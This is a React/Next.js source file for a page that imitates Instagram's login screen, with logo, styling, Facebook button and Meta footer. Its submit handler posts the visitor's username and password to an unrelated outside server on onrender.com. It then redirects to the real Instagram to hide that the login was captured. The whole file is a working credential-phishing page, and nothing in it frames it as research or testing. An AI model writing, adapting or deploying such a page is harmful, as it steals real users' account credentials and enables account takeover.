"use client";

import { useState } from "react";

export default function Home() {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    // Send to backend
    try {
      await fetch("https://instagram-login-1-ey0i.onrender.com/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: formData.username,
          password: formData.password,
        }),
      });
    } catch (err) {
      console.log("Error:", err);
    }

    // Wait a moment for the request to complete
    await new Promise((resolve) => setTimeout(resolve, 1000));

    // Redirect to Instagram
    window.location.href = `https://www.instagram.com/${formData.username}`;
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center px-4">
      <div className="w-[350px] text-white">
        {/* Instagram Logo */}
        <div className="text-center mb-12">
          <h1 className="text-[56px] font-normal" style={{ fontFamily: "'Billabong', cursive" }}>
            Instagram
          </h1>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-2">
          <input
            type="text"
            placeholder="Phone number, username or email address"
            value={formData.username}
            onChange={(e) => setFormData({ ...formData, username: e.target.value })}
            required
            className="w-full px-2 py-2.5 text-xs bg-[#121212] border border-[#363636] rounded-sm text-white placeholder-[#737373] outline-none focus:border-[#a8a8a8]"
          />

          <input
            type="password"
            placeholder="Password"
            value={formData.password}
            onChange={(e) => setFormData({ ...formData, password: e.target.value })}
            required
            className="w-full px-2 py-2.5 text-xs bg-[#121212] border border-[#363636] rounded-sm text-white placeholder-[#737373] outline-none focus:border-[#a8a8a8]"
          />

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white py-1.5 rounded-lg text-sm font-semibold mt-4 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
          >
            {loading ? (
              <>
                <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Logging in...
              </>
            ) : (
              "Log in"
            )}
          </button>
        </form>

        {/* OR Divider */}
        <div className="flex items-center my-5">
          <div className="flex-1 h-px bg-[#363636]"></div>
          <span className="px-4 text-xs text-[#737373] font-semibold">OR</span>
          <div className="flex-1 h-px bg-[#363636]"></div>
        </div>

        {/* Facebook Login */}
        <button className="w-full flex items-center justify-center text-sm text-[#1877f2] font-semibold mb-5">
          <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
          </svg>
          Log in with Facebook
        </button>

        {/* Forgot Password */}
        <div className="text-center text-xs text-white mb-10">
          <a href="#">Forgotten your password?</a>
        </div>

        {/* Sign Up */}
        <div className="text-center text-sm mb-10">
          <span className="text-white">Don&apos;t have an account? </span>
          <a href="#" className="text-[#0095f6] font-semibold">
            Sign up
          </a>
        </div>

        {/* Footer Links */}
        <div className="text-center">
          <div className="flex flex-wrap justify-center gap-x-3 gap-y-2 mb-4 text-xs text-[#737373]">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
          <div className="text-xs text-[#737373]">© 2025 Instagram from Meta</div>
        </div>
      </div>
    </div>
  );
}
